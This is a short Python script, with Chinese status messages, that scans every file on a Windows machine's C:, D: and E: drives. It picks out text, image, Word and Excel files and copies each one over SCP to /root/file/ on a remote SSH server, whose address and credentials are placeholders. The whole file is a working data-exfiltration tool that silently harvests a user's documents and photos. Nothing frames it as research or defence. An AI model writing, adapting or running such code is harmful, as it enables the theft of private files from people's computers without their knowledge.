import os
import paramiko
from scp import SCPClient
import threading
def scan_file(file_type):
    paths_lis = ['c:\\','d:\\','e:\\']
    files_lis = [os.walk(path_lis) for path_lis in paths_lis]
    for files in files_lis:
        for file in files:
            files_name = file[2]
            for file_name in files_name:
                file_path = file[0] + '\\' + file_name
                if file_type in file_name:
                    scp_updata(file_path,file_name)

def scp_updata(file_path,file_name):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    ssh_client.connect('ip地址', 22, '账号', '密码')
    scpclient = SCPClient(ssh_client.get_transport(), socket_timeout=15.0)

    try:
        scpclient.put(file_path, '/root/file/')
    except FileNotFoundError as e:
        print(e)
        print("系统找不到指定文件",file_path)
    else:
        print("文件上传成功",file_name)
    ssh_client.close()


if __name__ == '__main__':

    t1 = threading.Thread(target=scan_file,args=('.txt',))
    t2 = threading.Thread(target=scan_file,args=('.jpg',))
    t3 = threading.Thread(target=scan_file,args=('.doc',))
    t4 = threading.Thread(target=scan_file,args=('.xls',))
    t1.start()
    t2.start()
    t3.start()
    t4.start()